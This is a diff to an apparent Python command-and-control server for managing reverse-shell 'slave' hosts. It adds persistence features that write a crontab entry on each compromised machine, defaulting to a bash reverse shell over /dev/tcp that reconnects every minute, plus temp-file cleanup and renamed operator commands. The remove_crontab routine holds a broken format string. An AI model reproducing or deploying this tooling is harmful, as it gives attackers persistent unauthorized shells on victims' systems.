@@ -12,6 +12,9 @@ from utils.io import save_info, log_save, server_log
 import traceback
 import optparse
 import re
+import string
+import random
+import base64
 
 
 MAX_CONNECTION_NUMBER = 16
@@ -101,8 +104,71 @@ class Slave(object):
             pass
         lock.release()
 
-    def writecrontab(self):
-        pass
+    def save_crontab(self, target_file):
+        command = "crontab -l >%s" % target_file
+        try:
+            fd_send(self.socket_fd, command)
+        except socket.error:
+            self.del_socket()
+
+    # from
+    def add_crontab(self, content, user_fd):
+        # 1. Save old crontab
+        Log.info("Saving old crontab\n", user_fd)
+        chars = string.ascii_letters + string.digits
+        target_file = "/tmp/%s-system.server-%s\n" % (random_string(0x20, chars), random_string(0x08, chars))
+        self.save_crontab(target_file)
+        # 3. Add a new task
+        content = bytes(content, 'utf-8')
+        Log.info("Add new tasks : %s\n" % (content), user_fd)
+        command = 'echo "%s" | base64 -d >>%s\n' % (str(base64.b64encode(content), 'utf-8'), target_file)
+        #command = 'ls -la\n'
+        try:
+            fd_send(self.socket_fd, command)
+        except socket.error:
+            self.del_socket()
+        # 4. Rescue crontab file
+        Log.info("Rescuing crontab file...\n", user_fd)
+        command = 'crontab %s\n' % target_file
+        try:
+            fd_send(self.socket_fd, command)
+        except socket.error:
+            self.del_socket()
+        # 5. Delete temp file
+        Log.info("Deleting temp file...\n", user_fd)
+        command = "rm -rf %s\n" % (target_file)
+        try:
+            fd_send(self.socket_fd, command)
+        except socket.error:
+            self.del_socket()
+
+    def remove_crontab(self, pattern, user_fd):
+        # 1. Save old crontab
+        Log.info("Saving old crontab\n", user_fd)
+        chars = string.ascii_letters + string.digits
+        target_file = "/tmp/%s-system.server-%s\n" % (random_string(0x20, chars), random_string(0x08, chars))
+        self.save_crontab(target_file)
+        # 2. Delete old reverse shell tasks
+        Log.info("Removing old tasks in crontab...\n", user_fd)
+        command = 'sed -i "/%s/d" %s\n' % target_file
+        try:
+            fd_send(self.socket_fd, command)
+        except socket.error:
+            self.del_socket()
+        # 4. Rescue crontab file
+        Log.info("Rescuing crontab file...\n", user_fd)
+        command = 'crontab %s\n' % target_file
+        try:
+            fd_send(self.socket_fd, command)
+        except socket.error:
+            self.del_socket()
+        # 5. Delete temp file
+        Log.info("Deleting temp file...\n", user_fd)
+        command = "rm -rf %s\n" % target_file
+        try:
+            fd_send(self.socket_fd, command)
+        except socket.error:
+            self.del_socket()
 
     def del_socket(self):
         if self.node_hash in slaves.keys():
@@ -140,6 +206,10 @@ class Slave(object):
 #             time.sleep(0.5)
 
 
+def random_string(length, chars):
+    return "".join([random.choice(chars) for i in range(length)])
+
+
 def check_online_slave():
     l = []
     for key in slaves.keys():
@@ -147,7 +217,6 @@ def check_online_slave():
             msg = '\n'
             fd_send(slaves[key].socket_fd, msg)
             fd_send(slaves[key].socket_fd, msg)
-            #slaves[key].socket_fd.recv(2048)
         except socket.error:
             server_log(traceback.format_exc())
             l.append(key)
@@ -203,14 +272,13 @@ def transfer2user(user_fd, mod, **kwargs):
                         interactive_state = 'common_rec'
                         interactive_slave = None
                         break
-
             elif mod == 'Control_Command':
-                if command == 's\n':
+                if command == 'show\n' or command == 's\n':
                     check_online_slave()
                     print_salve(user_fd)
                 elif command == '\n':
                     continue
-                elif command == 'r\n':
+                elif command == 'recent\n' or command == 'r\n':
                     recent_log(user_fd)
                 elif command == 'i\n':
                     slave = choosed_slave
@@ -233,14 +301,31 @@ def transfer2user(user_fd, mod, **kwargs):
                     user_fd.shutdown(socket.SHUT_RDWR)
                     user_fd.close()
                     break
-                elif command == 'c\n':
+                elif command[0:6] == 'choose' or command == 'c\n':
                     #check_online_slave()
-                    msg = 'input the number of slave\n'
-                    Log.warning(msg, user_fd)
-                    print_salve(user_fd)
-                    choosed_slave = transfer2user(user_fd, 'choose_slave')
-                elif command == 'd\n':
-
+                    if command == 'c\n' or command == 'choose\n':
+                        msg = 'input the number of slave\n'
+                        Log.warning(msg, user_fd)
+                        print_salve(user_fd)
+                        choosed_slave = transfer2user(user_fd, 'choose_slave')
+                    elif command[0:7] == 'choose ':
+                        pa = re.compile(r'choose\s+(.*?)\n')
+                        res = pa.findall(command)
+                        if res:
+                            i = 0
+                            for key in slaves.keys():
+                                if str(i) == res[0]:
+                                    choosed_slave = slaves[key]
+                                    break
+                                i += 1
+                            if choosed_slave:
+                                msg = 'select the slave :'
+                                msg += choosed_slave.hostname + ' : ' + str(choosed_slave.port) + '\n'
+                                Log.success(msg, user_fd)
+                            else:
+                                msg = 'Do not have this slave.\n'
+                                fd_send(user_fd, msg)
+                elif command == 'del\n':
                     slave = choosed_slave
                     if not slave:
                         msg = 'Please choose the slave you want to Control\n'
@@ -251,13 +336,13 @@ def transfer2user(user_fd, mod, **kwargs):
                     msg = 'success to delete the slave \n'
                     Log.success(msg, user_fd)
                     choosed_slave = None
-                elif command[0] == 'n' and command[1] == ' ':
+                elif command[0:4] == 'name' and command[4] == ' ':
                     slave = choosed_slave
                     if not slave:
                         msg = 'Please choose the slave you want to Control\n'
                         Log.error(msg, user_fd)
                         continue
-                    pa = re.compile(r'n (.*?)\n')
+                    pa = re.compile(r'name\s+(.*?)\n')
                     res = pa.findall(command)
                     if not res:
                         msg = 'Please rewrite the name.\n'
@@ -265,6 +350,23 @@ def transfer2user(user_fd, mod, **kwargs):
                         continue
                     slave.name = res[0]
                     choosed_slave = None
+                elif command[0:3] == 'add' and (command[3] == ' ' or command[3] == '\n'):
+                    slave = choosed_slave
+                    if not slave:
+                        msg = 'Please choose the slave you want to Control\n'
+                        Log.error(msg, user_fd)
+                        continue
+                    if command[3] == ' ':
+                        pa = re.compile(r'add\s+(.*?)\n')
+                        res = pa.findall(command)
+                        if not res:
+                            msg = 'Please rewrite the add command.\n'
+                            Log.error(msg, user_fd)
+                            continue
+                        slave.add_crontab(res[0], user_fd)
+                    else:
+                        content = '''\n* * * * *  bash -c "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"\n'''
+                        slave.add_crontab(content, user_fd)
                 else:
                     print_command(user_fd)
             elif mod == 'choose_slave':
@@ -350,11 +452,13 @@ def recent_log(user_fd):
 
 
 def print_command(user_fd):
-    msg = '''    [s] : show all slave
-    [d] : delete the slave (after choose)
-    [c] : choose a slave
+    msg = '''    [show] : show all slave
     [i] : open a interactive shell (after choose)
-    [r] : To print Recent connect log
+    [del] : delete the slave (after choose)
+    [choose] : choose a slave
+    [name xxxx] : rename a slave (after choose)
+    [recent] : To print Recent connect log
+    [add xxxx] : add crontab, if not xxxx then default bash shell (after choose)
     [exit] : exit\n'''
     Log.info(msg, user_fd)
 
@@ -407,7 +511,7 @@ def printlogo(user_fd):
 
 def fd_send(fd, message):
     infob = str.encode(message)
-    fd.send(infob)
+    fd.sendall(infob)
 
 
 def check_admin(user_fd):
